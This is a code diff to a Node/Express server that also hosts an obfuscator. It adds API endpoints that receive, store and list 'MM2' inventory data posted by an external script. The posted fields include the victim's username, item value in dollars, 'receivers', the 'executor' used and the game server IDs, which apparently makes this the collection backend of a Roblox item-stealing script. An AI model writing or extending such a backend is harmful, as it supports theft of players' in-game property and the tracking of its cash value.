@@ -12,6 +12,73 @@ app.get('/obfuscator', (req, res) =>
     res.sendFile(path.join(__dirname, 'public', 'obfuscator.html')));
 app.get('/engine.js', (req, res) =>
     res.sendFile(path.join(__dirname, 'obfuscator', 'engine.js')));
+
+// ⚠️ ADDED: MM2 Inventory API endpoints
+// Simple in-memory storage for inventory data
+const inventoryData = new Map();
+
+// Get all inventory data
+app.get('/api/inventory', (req, res) => {
+    const data = Array.from(inventoryData.entries()).map(([username, data]) => ({
+        username,
+        ...data
+    }));
+    res.json(data);
+});
+
+// Get specific user's inventory
+app.get('/api/inventory/:username', (req, res) => {
+    const username = req.params.username;
+    const data = inventoryData.get(username);
+    if (data) {
+        res.json({ username, ...data });
+    } else {
+        res.status(404).json({ error: 'User not found' });
+    }
+});
+
+// Receive inventory data from script
+app.post('/api/inventory', (req, res) => {
+    const { username, inventory, totalValue, totalDollar, receivers, executor, placeId, jobId } = req.body;
+
+    if (!username || !inventory) {
+        return res.status(400).json({ error: 'Missing required fields' });
+    }
+
+    // Store inventory data
+    inventoryData.set(username, {
+        inventory,
+        totalValue,
+        totalDollar,
+        receivers,
+        executor,
+        placeId,
+        jobId,
+        timestamp: new Date().toISOString()
+    });
+
+    console.log(`[${new Date().toISOString()}] Inventory received from ${username}`);
+    console.log(`  Total Value: ${totalValue}, Total Dollar: $${totalDollar}`);
+    console.log(`  Receivers: ${receivers ? receivers.join(', ') : 'none'}`);
+
+    res.json({ success: true, message: 'Inventory data received' });
+});
+
+// Clear inventory data
+app.delete('/api/inventory/:username', (req, res) => {
+    const username = req.params.username;
+    inventoryData.delete(username);
+    res.json({ success: true, message: 'Inventory data cleared' });
+});
+
+// Clear all inventory data
+app.delete('/api/inventory', (req, res) => {
+    inventoryData.clear();
+    res.json({ success: true, message: 'All inventory data cleared' });
+});
+
+// ⚠️ END ADDED INVENTORY API
+
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
 
